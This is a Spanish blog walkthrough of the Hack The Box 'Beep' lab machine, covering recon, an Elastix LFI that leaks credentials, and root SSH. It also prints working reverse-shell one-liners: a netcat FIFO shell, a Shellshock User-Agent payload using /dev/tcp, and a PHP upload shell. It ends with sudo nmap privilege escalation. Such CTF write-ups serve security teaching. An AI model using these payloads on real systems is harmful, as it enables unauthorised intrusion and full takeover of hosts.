procederemos a autenticarnos con las credenciales encontradas: ssh root@10.10.10.7 Al intentar conectarnos por SSH, vemos que la conexión no se puede establecer debido a que no existe un algoritmo de encriptación en común entre la máquina víctima, y nuestra máquina de atacante. Para solucionar este problema, debemos forzar a nuestra máquina usar alguno de los algoritmos que se nos presenta, pese a ser considerados como menos seguros. ssh -o KexAlgorithms=diffie-hellman-group-exchange-sha1 root@10.10.10.7 Al habernos conectado a la máquina directamente como root, no es necesario realizar la escalada de privilegios, por lo que podríamos listar sin ningún problema tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios. Fase De Explotación - Webmin Al igual que intentamos probar contraseñas por defecto en el panel de login del servicio Elastix, podemos hacer lo mismo en el panel de autenticación del servicio Webmin, pero al igual que ocurrió antes, las siguientes credenciales no nos permiten ingresar. Otra opción muy buena sería utilizar las credenciales que encontramos antes, las cuales de hecho funcionan, es decir, se están reutilizando credenciales, otra muy mala práctica que aún hoy en día, persiste. Estando dentro podríamos programar la ejecución de cualquier comando, a nivel de cualquier usuario en el sistema, en nuestro caso, nos interesa entablarnos una reverse shell; aquí tenemos algunos ejemplos, pero nosotros los vamos a hacer a través de NetCat. Para lo cual, desde nuestra máquina de atacantes deberemos de ponernos en escucha a través del puerto que queramos. sudo nc -nlvp &lt;puertoCualquiera&gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;nuestraIP&gt; &lt;puertoCualquiera&gt; &gt;/tmp/f Después de darle a save, y habiendo pasado el tiempo que hayamos programado, conseguiremos una shell como el usuario root, por lo que nuevamente, no hizo falta la escalada de privilegios. De modo que podremos leer sin problema alguno tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios. Fase De Explotación - Shellshock Si nos percatamos, en el ataque anterior, depués de haber intentado ingresar como un usuario no válido, se añade al url /session_login.cgi Esto llama nuestra atención ya que los archivos de extensión .cgi, o dentro del directorio /cgi-bin/, son utilizados para ejecutar programas en el servidor, y esto lo hacen a través de una interfaz de línea comandos (CLI), por lo que, si la bash es vulnerable, podemos realizar un ataque shellshock. Lo más cómodo sería realizar este ataque desde nuestra terminal, sin embargo, debido al problema del certificado SSL autofirmado, a la hora de utilizar el comando curl, nos va a dar un error. Este error lo podríamos solucionar utilizando uno de los parámetros que nos otorga curl, concretamente el parámetro -k o --insecure, el cual permite tramitar este tipo de peticiones inseguras. Sin embargo, ni así, nos es posible explotar el shellshock de esta forma, por lo que tendremos que hacerlo de otra manera. Para poder cambiar el User-Agent de otra forma, podríamos hacerlo a través de Burp Suite, y así, entablarnos una reverse shell. Primero vamos a emitir una petición al panel de autenticación con credenciales al azar, y posteriormente, desde Burp Suite, con Ctrl + R, vamos a mandar nuestra petición al Repeater. Después, vamos a borrar el contenido que se encuentra en el campo User-Agent, y lo vamos a reemplazar con nuestro código malicioso. Para variar un poco, la reverse shell la conseguiremos a través de bash, a diferencia de como lo hicimos en la explotación del servicio Webmin; nuevamente, este tipo de reverse shells, las podemos conseguir aquí. En primer lugar, desde nuestra máquina de atacantes, a través de NetCat, tenemos que ponernos en escucha a través de un puerto cualquiera. sudo nc -nlvp &lt;puertoCualquiera&gt; Y, el código malicioso que vamos a ingresar en el campo User-Agent será: () { :; }; bash -i &gt;&amp; /dev/tcp/&lt;nuestraIP&gt;/&lt;puertoCualquiera&gt; 0&gt;&amp;1 Finalmente, presionaremos el botón Send, para que emitir nuestra petición. Y al igual que en los casos anteriores, sin necesidad de escalada de privilegios, podremos leer tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios, sin ninguna complicación. Fase De Explotación - File Upload Bypass Si recordamos, en la fase de explotación a través del uso de un LFI, habíamos descubierto un panel de login de Vtiger CRM; al igual que en las situaciones anteriores, podemos probar una serie de credenciales por defecto, pero estas no servirán, por lo que nos queda la opción de reutilizar las credenciales que ya habíamos encontrado. Y en efecto, una vez dentro, podemos empezar a investigar un poco; en el apartado Settings/Company Details, vamos a ver que hay una opción que nos permite cambiar el logo de la compañía, por lo que ya vamos teniendo una idea, de que podemos hacer. De manera casi similar a la máquina Vulnversity de TryHackMe, vamos a tener que disfrazar un archivo .php como .jpg. No obstante, en este caso será un poco más sencillo ya que no haremos uso de Burp Suite (aunque podríamos); lo único que vamos a hacer es añadir la extensión .jpg a nuestra reverseShell.php. Podríamos utilizar la reverse shell que nos provee pentestmonkey (para lo cual debemos modificar el campo ip, y colocar la nuestra, y si quisiéramos el campo port), o bien, crear nuestra propia reverse shell. &lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;nuestraIP&gt; &lt;puertoCualquiera&gt; &gt;/tmp/f&quot;); ?&gt; Y al igual que en los casos anteriores, previo a darle a Save, debemos de estar en escucha a través de NetCat, por el puerto que hayamos indicado en nuestra reverse shell. sudo nc -nlvp &lt;puertoCualquiera&gt; Si nos percatamos, a diferencia de los casos anteriores, en esta ocasión ya no somos el usuario root, somos el usuario asterisk, por lo que ahora si debemos de realizar la escalada de privilegios. Escalada De Privilegios Para conseguir la primera flag, no tenemos que realizar ningún proceso, como el usuario asterisk, nos es posible leer la flag del usuario con bajos privilegios. Para conseguir la flag del usuario con máximos privilegios, al ser el usuario asterisk, será bastante sencillo, ya que este usuario usualmente tiene acceso a ejecutar algunos binarios haciendo uso de sudo, por lo que, lo primero que vamos a hacer es listar que binarios podemos ejecutar como root. sudo -l La mejor forma para abusar de cualquier binario, es recurrir a GTFOBins, esta página nos enseña como explotar binarios con capabilities mal asignadas, binarios con permisos SUID mal asignados, y en este caso, binarios que se pueden ejecutar como root. En este caso, tenemos un abanico de oportunidades, tenemos binarios como chmod, chown, service, yum, y el binario que vamos a explotar en esta ocasión: nmap. Para explotar el binario nmap, bastará con ejecutar su modo interactivo, con el cual después, generaremos una bash con máximo privilegios. sudo nmap --interactive !sh Posterior a ello, podemos buscar la flag dentro de todo el sistema, y leerla.","headline":"Beep - Hack The Box","mainEntityOfPage":{"@type":"WebPage","@id":"/es/Beep-Hack-The-Box/"},"url":"/es/Beep-Hack-The-Box/"}</script>
<!-- End Jekyll SEO tag -->


  <!-- Google Tag Manager -->
  <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
  new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
  j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
  'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
  })(window,document,'script','dataLayer','GTM-PPKV9V8T');</script>
  <!-- End Google Tag Manager -->

</head>



<body>

  <!-- Google Tag Manager (noscript) -->
  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PPKV9V8T"
  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
  <!-- End Google Tag Manager (noscript) -->

  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    
    <h1 class="glitch-header">filthyHacker@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/es"><h2 class="header-link">Publicaciones</h2></a>
<a href="/es/search"><h2 class="header-link">Buscar</h2></a>
<a href="/es/archive"><h2 class="header-link">Archivo</h2></a>
<a href="/en"><h2 class="header-link">English</h2></a>

    </div>
  </div>
</header>

    <div class="container">
      <section id="main_content">
        <article>
  <h2>Beep - Hack The Box</h2>
  <time datetime="2021-12-06T00:00:00-05:00" class="by-line">
    
      06/12/2021
    
  </time>
  <p>En esta ocasión vamos a resolver la máquina <em>Beep</em> de <em>Hack The Box</em>. Es una máquina <em>Linux</em> de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/1.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Esta máquina nos permite realizar, tanto la intrusión, como la escalada de privilegios, de distintas maneras, por lo que es genial para aprender algunas técnicas de explotación, las cuales vamos a cubrir.</p>

<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>

<p>Primeramente vamos a lanzar una <em>traza ICMP</em> para saber si la máquina está activa.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.7
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/2.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del <em>TTL</em>; en este caso el valor del <em>TTL</em> de la máquina es <code class="language-plaintext highlighter-rouge">63</code>, por lo que podemos intuir que estamos ante una máquina <em>Linux</em>. Recordemos que algunos de los valores referenciales son los siguientes:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Sistema Operativo (OS)</th>
      <th style="text-align: left">TTL</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">Linux</td>
      <td style="text-align: left">64</td>
    </tr>
    <tr>
      <td style="text-align: left">Windows</td>
      <td style="text-align: left">128</td>
    </tr>
    <tr>
      <td style="text-align: left">Solaris</td>
      <td style="text-align: left">254</td>
    </tr>
  </tbody>
</table>

<p>Si nos damos cuenta, en esta ocasión, el valor del <em>TTL</em> es <code class="language-plaintext highlighter-rouge">63</code> y no <code class="language-plaintext highlighter-rouge">64</code> como indica la tabla anterior, esto se debe a que en el entorno de máquinas de <em>Hack The Box</em>, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el <em>TTL</em> disminuye en una unidad.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.7 -R                               
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/3.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Posteriormente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.7
</code></pre></div></div>

<p>En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.7
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de puertos con <em>Nmap</em>:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Parámetro</th>
      <th style="text-align: left">Explicación</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">-p-</td>
      <td style="text-align: left">Escanea todo el rango de puertos (65535 en total)</td>
    </tr>
    <tr>
      <td style="text-align: left">--open</td>
      <td style="text-align: left">Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)</td>
    </tr>
    <tr>
      <td style="text-align: left">-T5</td>
      <td style="text-align: left">La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos <code class="language-plaintext highlighter-rouge">White Hat</code></td>
    </tr>
    <tr>
      <td style="text-align: left">-v</td>
      <td style="text-align: left"><em>Verbose</em>, reporta lo encontrado por consola</td>
    </tr>
    <tr>
      <td style="text-align: left">-n</td>
      <td style="text-align: left">No aplicar <em>resolución DNS</em></td>
    </tr>
    <tr>
      <td style="text-align: left">-sS</td>
      <td style="text-align: left">Escaneo <em>TCP SYN</em></td>
    </tr>
    <tr>
      <td style="text-align: left">-min-rate</td>
      <td style="text-align: left">Emitir paquetes no más lentos que &lt;valor&gt; por segundo</td>
    </tr>
    <tr>
      <td style="text-align: left">-vvv</td>
      <td style="text-align: left">Triple <em>verbose</em>, para obtener mayor información por consola</td>
    </tr>
    <tr>
      <td style="text-align: left">-Pn</td>
      <td style="text-align: left">No aplicar <em>host discovery</em></td>
    </tr>
  </tbody>
</table>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con <em>Nmap</em>:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Parámetro</th>
      <th style="text-align: left">Explicación</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">-sC</td>
      <td style="text-align: left">Scripts básicos de enumeración</td>
    </tr>
    <tr>
      <td style="text-align: left">-sV</td>
      <td style="text-align: left">Versión y servicios que corren bajo los puertos encontrados</td>
    </tr>
    <tr>
      <td style="text-align: left">-p</td>
      <td style="text-align: left">Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)</td>
    </tr>
  </tbody>
</table>

<p>Basándonos en la información que nos reporta <em>Nmap</em>, podemos darnos cuenta que la máquina víctima tiene abiertos algunos puertos relacionados con <code class="language-plaintext highlighter-rouge">HTTP</code> y <code class="language-plaintext highlighter-rouge">HTTPS</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/4.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Debido a que la máquina cuenta con estos puertos abiertos, podríamos intentar aplicar <code class="language-plaintext highlighter-rouge">fuzzing</code>, no obstante, no vamos a encontrar nada interesante.</p>

<p>Lo siguiente que podemos hacer es determinar ante que nos estamos enfrentando, para ello podemos hacer uso de <code class="language-plaintext highlighter-rouge">WhatWeb</code>, herramienta que se encarga de identificar que tecnologías web se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.10.7
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb https://10.10.10.7
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb https://10.10.10.7:10000
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/5.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Como podemos observar, no hay nada especialmente relevante, a excepción de ese error relacionado con <em>SSL</em> que aparece cuando visitamos la página a través del protocolo <code class="language-plaintext highlighter-rouge">HTTPS</code>, el cual no es nada grave, y de hecho lo veremos en un momento.</p>

<p>En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/6.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Vemos que al abrir la primera página desde nuestro navegador (y por consiguiente la segunda, pues se está aplicando un redirect como pudimos ver en lo reportado por <code class="language-plaintext highlighter-rouge">WhatWeb</code>), nos salta un aviso de que la conexión no es segura, y esto se debe a que el <em>certificado SSL</em> que se está empleando, es autofirmado, por lo que se lo considera inseguro. En esta ocasión, y como sabemos que la página web pertenece a <em>HackTheBox</em>, haremos caso omiso a la advertencia y procederemos a la página web.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/7.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Lo primero que llama nuestra atención es <code class="language-plaintext highlighter-rouge">Elastix</code>, el cual es un software encargado de unificar servicios PBX IP, correo electrónico, mensajería instantánea, fax entre otros, el cual va bastante de la mano con <code class="language-plaintext highlighter-rouge">Asterisk</code>.</p>

<p>Respecto a la tercera página web, el navegador nuevamente nos avisará del <em>certificado SSL</em> autofirmado, aviso, el cual una vez más obviaremos.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/8.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Una vez dentro, lo primero que vemos es un panel que nos pide autenticar para tener acceso a <code class="language-plaintext highlighter-rouge">Webmin</code>, una herramienta que permite la administración de servicios basados en <em>Unix</em>.</p>

<h3 id="fase-de-explotación"><a href="#header-3"></a>Fase De Explotación</h3>

<p>Como mencioné en un inicio, la máquina <em>Beep</em> cuenta con varios vectores para realizar la fase de explotación; de hecho, para tres de ellos ni siquiera hace falta la escalada de privilegios.</p>

<h3 id="fase-de-explotación---local-file-inclusion"><a href="#header-3"></a>Fase De Explotación - Local File Inclusion</h3>

<p>Lo primero que se nos puede ocurrir a la hora de encontrar un panel de login, sería probar contraseñas por defecto (un error bastante común aún hoy en día). Sin embargo, ninguna de las <a href="https://www.elastix.org/community/threads/default-passwords-not-password.8416/">siguientes</a> credenciales nos es de ayuda para logearnos en el servicio de <code class="language-plaintext highlighter-rouge">Elastix</code></p>

<p>La siguiente idea que podemos probar, sería buscar algún tipo de <em>exploit</em> para el servicio <code class="language-plaintext highlighter-rouge">Elastix</code>; para ello utilizaremos <em>SearchSploit</em>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit Elastix
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/9.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>En este caso <em>SearchSploit</em> nos muestra algunos <em>exploits</em> interesantes, sin embargo, nos vamos a quedar con el que nos permite realizar un <a href="https://mateonitro550.github.io/Local-File-Inclusion-(LFI)"><em>Local File Inclusion (LFI)</em></a>, vulnerabilidad que ya revisamos.</p>

<p>En este caso no nos haría falta descargar el <em>exploit</em>, ya que lo más probable es que nos indique en que ruta podemos aplicar el <em>LFI</em>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit -x php/webapps/37637.pl
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/10.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>En efecto, pero antes de intentar explotar este <em>LFI</em>, debemos confirmar si en primer lugar existe la primera ruta, <code class="language-plaintext highlighter-rouge">/vtigercrm/</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/11.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Una vez confirmamos que la ruta existe, podemos pasar a explotar el <em>LFI</em>. Si nos percatamos, se está haciendo uso de un <em>null byte</em>, así como de varios <em>directory path traversal</em>, esto con el fin de leer el archivo <code class="language-plaintext highlighter-rouge">/etc/amportal.conf</code>, pero perfectamente podríamos listar cualquier otro archivo del sistema.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/12.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Leer esto así es un poco complicado, así que podríamos hacer <code class="language-plaintext highlighter-rouge">Ctrl + U</code>, para verlo de mejor manera.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/13.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>El archivo <code class="language-plaintext highlighter-rouge">/etc/amportal.conf</code>, como su nombre mismo indica, es un archivo de configuración para el portal de gestión de <code class="language-plaintext highlighter-rouge">Asterisk</code>.</p>

<p>Si recordamos, otro servicio que detectamos con <em>Nmap</em>, fue el servicio <em>SSH</em> en el puerto <code class="language-plaintext highlighter-rouge">22</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/14.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Por lo que procederemos a autenticarnos con las credenciales encontradas:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh root@10.10.10.7
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/15.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Al intentar conectarnos por <em>SSH</em>, vemos que la conexión no se puede establecer debido a que no existe un algoritmo de encriptación en común entre la máquina víctima, y nuestra máquina de atacante. Para solucionar este problema, debemos forzar a nuestra máquina usar alguno de los algoritmos que se nos presenta, pese a ser considerados como menos seguros.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -o KexAlgorithms=diffie-hellman-group-exchange-sha1 root@10.10.10.7
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/16.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Al habernos conectado a la máquina directamente como root, no es necesario realizar la escalada de privilegios, por lo que podríamos listar sin ningún problema tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/17.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<h3 id="fase-de-explotación---webmin"><a href="#header-3"></a>Fase De Explotación - Webmin</h3>

<p>Al igual que intentamos probar contraseñas por defecto en el panel de login del servicio <code class="language-plaintext highlighter-rouge">Elastix</code>, podemos hacer lo mismo en el panel de autenticación del servicio <code class="language-plaintext highlighter-rouge">Webmin</code>, pero al igual que ocurrió antes, las <a href="https://help.eset.com/era_deploy_va/64/en-US/index.html?webmin.htm">siguientes</a> credenciales no nos permiten ingresar.</p>

<p>Otra opción muy buena sería utilizar las credenciales que encontramos antes, las cuales de hecho funcionan, es decir, se están reutilizando credenciales, otra muy mala práctica que aún hoy en día, persiste.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/18.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Estando dentro podríamos programar la ejecución de cualquier comando, a nivel de cualquier usuario en el sistema, en nuestro caso, nos interesa entablarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>; <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">aquí</a> tenemos algunos ejemplos, pero nosotros los vamos a hacer a través de <code class="language-plaintext highlighter-rouge">NetCat</code>.</p>

<p>Para lo cual, desde nuestra máquina de atacantes deberemos de ponernos en escucha a través del puerto que queramos.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nc -nlvp &lt;puertoCualquiera&gt;
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/19.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;nuestraIP&gt; &lt;puertoCualquiera&gt; &gt;/tmp/f
</code></pre></div></div>
<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/20.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Después de darle a <code class="language-plaintext highlighter-rouge">save</code>, y habiendo pasado el tiempo que hayamos programado, conseguiremos una shell como el usuario root, por lo que nuevamente, no hizo falta la escalada de privilegios.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/21.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>De modo que podremos leer sin problema alguno tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/22.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<h3 id="fase-de-explotación---shellshock"><a href="#header-3"></a>Fase De Explotación - Shellshock</h3>

<p>Si nos percatamos, en el ataque anterior, depués de haber intentado ingresar como un usuario no válido, se añade al <em>url</em> <code class="language-plaintext highlighter-rouge">/session_login.cgi</code></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/23.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Esto llama nuestra atención ya que los archivos de extensión <code class="language-plaintext highlighter-rouge">.cgi</code>, o dentro del directorio <code class="language-plaintext highlighter-rouge">/cgi-bin/</code>, son utilizados para ejecutar programas en el servidor, y esto lo hacen a través de una interfaz de línea comandos (CLI), por lo que, si la bash es vulnerable, podemos realizar un ataque <a href="https://mateonitro550.github.io/Shellshock">shellshock</a>.</p>

<p>Lo más cómodo sería realizar este ataque desde nuestra terminal, sin embargo, debido al problema del <em>certificado SSL</em> autofirmado, a la hora de utilizar el comando <code class="language-plaintext highlighter-rouge">curl</code>, nos va a dar un error.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/24.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Este error lo podríamos solucionar utilizando uno de los parámetros que nos otorga <code class="language-plaintext highlighter-rouge">curl</code>, concretamente el parámetro <code class="language-plaintext highlighter-rouge">-k</code> o <code class="language-plaintext highlighter-rouge">--insecure</code>, el cual permite tramitar este tipo de peticiones inseguras. Sin embargo, ni así, nos es posible explotar el <code class="language-plaintext highlighter-rouge">shellshock</code> de esta forma, por lo que tendremos que hacerlo de otra manera.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/25.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Para poder cambiar el <code class="language-plaintext highlighter-rouge">User-Agent</code> de otra forma, podríamos hacerlo a través de <code class="language-plaintext highlighter-rouge">Burp Suite</code>, y así, entablarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>

<p>Primero vamos a emitir una petición al panel de autenticación con credenciales al azar, y posteriormente, desde <code class="language-plaintext highlighter-rouge">Burp Suite</code>, con <code class="language-plaintext highlighter-rouge">Ctrl + R</code>, vamos a mandar nuestra petición al <code class="language-plaintext highlighter-rouge">Repeater</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/26.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/27.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Después, vamos a borrar el contenido que se encuentra en el campo <code class="language-plaintext highlighter-rouge">User-Agent</code>, y lo vamos a reemplazar con nuestro código malicioso. Para variar un poco, la <code class="language-plaintext highlighter-rouge">reverse shell</code> la conseguiremos a través de bash, a diferencia de como lo hicimos en la explotación del servicio <code class="language-plaintext highlighter-rouge">Webmin</code>; nuevamente, este tipo de <code class="language-plaintext highlighter-rouge">reverse shells</code>, las podemos conseguir <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">aquí</a>.</p>

<p>En primer lugar, desde nuestra máquina de atacantes, a través de <code class="language-plaintext highlighter-rouge">NetCat</code>, tenemos que ponernos en escucha a través de un puerto cualquiera.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nc -nlvp &lt;puertoCualquiera&gt;
</code></pre></div></div>

<p>Y, el código malicioso que vamos a ingresar en el campo <code class="language-plaintext highlighter-rouge">User-Agent</code> será:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>() { :; }; bash -i &gt;&amp; /dev/tcp/&lt;nuestraIP&gt;/&lt;puertoCualquiera&gt; 0&gt;&amp;1
</code></pre></div></div>

<p>Finalmente, presionaremos el botón <code class="language-plaintext highlighter-rouge">Send</code>, para que emitir nuestra petición.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-06-Beep-Hack-The-Box/28.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Y al igual que en los casos anteriores, sin necesidad de escalada de privilegios, podremos leer tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios, sin ninguna complicación.</p>

<h3 id="fase-de-explotación---file-upload-bypass"><a href="#header-3"></a>Fase De Explotación - File Upload Bypass</h3>

